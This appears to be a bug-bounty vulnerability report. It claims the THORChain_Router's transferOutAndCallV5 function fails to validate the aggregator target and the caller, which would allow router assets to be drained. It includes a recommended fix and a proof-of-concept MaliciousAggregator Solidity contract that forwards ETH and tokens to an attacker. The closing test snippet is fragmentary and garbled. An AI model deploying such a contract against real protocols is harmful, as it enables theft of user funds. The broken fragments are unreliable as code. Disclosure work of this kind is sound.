# Vulnerability details

## Summary

The `transferOutAndCallV5` function in the `THORChain_Router` contract is vulnerable to unauthorized asset transfers due to insufficient validation of the `aggregationPayload.target` parameter. This allows a malicious contract to impersonate a valid whitelisted aggregator and drain assets from the router.

## Vulnerability Detail

The `transferOutAndCallV5` function allows for the transfer of assets from the router to a target address, with additional data and conditions specified in the payload. However, the function does not properly validate the `target` parameter in the `aggregationPayload` nor it checks against a list of trusted vaults. This lack of validation permits a malicious contract to act as a recipient and execute arbitrary code, gaining the literal possibility to transfer assets out of the router without proper authorization.

Furthermore, in the bug bounty terms we would find that:

1. "although all of the Router's functions are public, only depositWithExpiry is "meant" to be called by external parties. Of course, since the functions are public anyone can call them, but an external party should not be able to impersonate a vault in order to move the network's ERC20s or other assets. This is achieved through the private _vaultAllowance map, which keeps track of each vault's spendable ERC20s. As users call depositWithExpiry the target vault's allowance is incremented, and a transferOut, transferOutAndCall, or transferAllowance call will decrement a vault's allowance."

2. "depositWithExpiry - all EVM-based actions on THORChain are initiated through this function. This should increase the target vault's allowance (if an ERC20 is deposited), or increase the vault's ETH balance if ETH is sent in.

Params:

vault (address): The THORChain vault to deposit the asset to
asset (address): The asset being deposited (null address for ETH)
amount (uint256): Amount of asset being deposited in asset’s decimals. Not required for ETH, transaction value used instead.
memo (string): The THORChain memo indicating transaction intent. More information about memos here.
expiration (uint256): The expiration of this deposit in seconds. Transactions confirmed after this expiry should be reverted.

Events:

DepositEvent: if emitted, Bifrost will observe and post a MsgObservedTxIn transaction to THORChain to initiate the action.

transferOutAndCallV5 - intended to only be called by a THORChain vault. transferOutAndCall calls a whitelisted “aggregator” contract’s swapOut function that in turn initiates a transaction on a 3rd party protocol. This is used to daisy chain swaps with external liquidity, enabling swaps such as DOGE−>DOGE−>SHIB (DOGE → ETH on THORChain, and ETH → SHIB on Uniswap).

Params:

aggregator (address) - The address of the whitelisted aggregator
finalToken (address) - The final token of the aggregator call (e.g. SHIB)
to (address) - User’s destination address
amountOutMin (uint256) - Limit for the final swap
memo (string) - THORChain’s outbound memo
payload (bytes) - arbitrary bytes passed to aggregator contract
originAddress (string)(optional) - source address of the swap"

The vulnerability arises because the contract relies on the `target` address provided in the payload without verifying if it is an authorized/whitelisted aggregator. Given that a deposit would inrease _vaultAllowances, this allows an attacker to craft a payload that directs the router to transfer assets (a specific whitelisted ERC20 token) to a malicious contract, without necessarily the need to have control over the vault's private key or either relying on a vault at all since the lack of the onlyVault() modifier.

## Impact

An attacker can exploit this vulnerability to execute unauthorized transfers, draining all of the assets contained in the router. This can lead to a drastic loss of funds on the side of the THORChain protocol, ultimately affecting its users and overall liquidity.

## Recommended steps:

Implement a strict validation mechanism to ensure that the `target` address in the `aggregationPayload` is a legitimate, whitelisted aggregator. This can be achieved by maintaining a list of authorized aggregators and checking against this list before proceeding with the transfer.

Example of adding validation:

```solidity
mapping(address => bool) public authorizedAggregators;

modifier onlyAuthorizedAggregator(address target) {
    require(authorizedAggregators[target], "Unauthorized aggregator");
    _;
}

function _transferOutAndCallV5(TransferOutAndCallData calldata aggregationPayload) private onlyAuthorizedAggregator(aggregationPayload.target) {
    // code for _transferOutAndCallV5
}
```

Also ensure that `transferOutAndCallV5` and similar functions can only be called by authorized vaults. This can be enforced using access control mechanisms such as the `onlyVault` modifier.

## Proof of Concept

- An attacker, by leveraging a legitimate context (i.e., a user-controlled account with necessary approvals and balances), can interact with this function.
- The attack involves depositing tokens into the router through `depositWithExpiry`, which increases the vault’s allowance for those tokens.
- Then, the attacker calls `transferOutAndCallV5`, crafting a payload that exploits the function to move tokens to an address of their choice.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

contract MaliciousAggregator {
    address payable public attacker;

    constructor(address payable _attacker) {
        attacker = _attacker;
    }

    function swapOutV5(
        address fromAsset,
        uint256 fromAmount,
        address toAsset,
        address recipient,
        uint256 amountOutMin,
        bytes memory payload,
        string memory originAddress
    ) public payable {
        // Transfer all received ETH to the attacker
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "Transfer failed");

        // For ERC20 tokens, we assume that the contract has an allowance
        if (fromAsset != address(0)) {
            (bool tokenSuccess, ) = fromAsset.call(
                abi.encodeWithSignature("transfer(address,uint256)", attacker, fromAmount)
            );
            require(tokenSuccess, "Token transfer failed");
        }
    }

    // Fallback function to accept ETH
    receive() external payable {}
}
```

    await TOKEN.approve(ROUTER1.address, _1m, { from: ATTACKER });

      name: 'swapOutV5',
      type: 'function',

        type: 'address',
        name: 'fromAsset'

        type: 'uint256',
        name: 'fromAmount'
      }, {
        type: 'address',
        name: 'toAsset'

        type: 'address',
        name: 'recipient'

        type: 'uint256',

        type: 'bytes',

        type: 'string',
        name: 'originAddress'
